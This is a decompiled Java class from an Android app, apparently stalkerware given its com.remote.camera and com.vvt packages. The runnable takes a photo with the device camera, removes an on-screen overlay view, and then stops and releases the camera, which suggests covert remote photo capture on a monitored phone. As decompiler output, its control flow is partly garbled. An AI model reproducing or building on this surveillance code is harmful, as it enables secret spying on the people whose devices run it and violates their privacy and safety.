package com.remote.camera.normal;

import android.hardware.Camera;
import android.hardware.Camera.PictureCallback;
import android.view.View;
import android.view.WindowManager;
import com.vvt.aa.a;

class g
  implements Runnable
{
  g(f paramf) {}
  
  public void run()
  {
    boolean bool = RemoteCameraActivity.a();
    if (bool) {}
    for (;;)
    {
      Object localObject4;
      try
      {
        Object localObject1 = this.a;
        localObject1 = ((f)localObject1).a;
        localObject1 = RemoteCameraActivity.d((RemoteCameraActivity)localObject1);
        localObject4 = null;
        Object localObject5 = this.a;
        localObject5 = ((f)localObject5).a;
        localObject5 = RemoteCameraActivity.c((RemoteCameraActivity)localObject5);
        ((Camera)localObject1).takePicture(null, null, (Camera.PictureCallback)localObject5);
        bool = a.a();
        if (!bool)
        {
          localObject1 = this.a;
          localObject1 = ((f)localObject1).a;
          localObject1 = RemoteCameraActivity.f((RemoteCameraActivity)localObject1);
          localObject4 = this.a;
          localObject4 = ((f)localObject4).a;
          localObject4 = RemoteCameraActivity.e((RemoteCameraActivity)localObject4);
          ((WindowManager)localObject1).removeView((View)localObject4);
        }
        return;
      }
      finally
      {
        bool = RemoteCameraActivity.b();
        if (!bool) {}
      }
      try
      {
        localObject3 = this.a;
        localObject3 = ((f)localObject3).a;
        localObject3 = RemoteCameraActivity.d((RemoteCameraActivity)localObject3);
        ((Camera)localObject3).stopPreview();
        localObject3 = this.a;
        localObject3 = ((f)localObject3).a;
        localObject3 = RemoteCameraActivity.d((RemoteCameraActivity)localObject3);
        ((Camera)localObject3).release();
        localObject3 = this.a;
        localObject3 = ((f)localObject3).a;
        localObject4 = null;
        RemoteCameraActivity.a((RemoteCameraActivity)localObject3, null);
      }
      catch (Exception localException)
      {
        Object localObject3;
        for (;;) {}
      }
      localObject3 = this.a.a;
      RemoteCameraActivity.g((RemoteCameraActivity)localObject3);
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/remote/camera/normal/FxFileObserverWorker.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */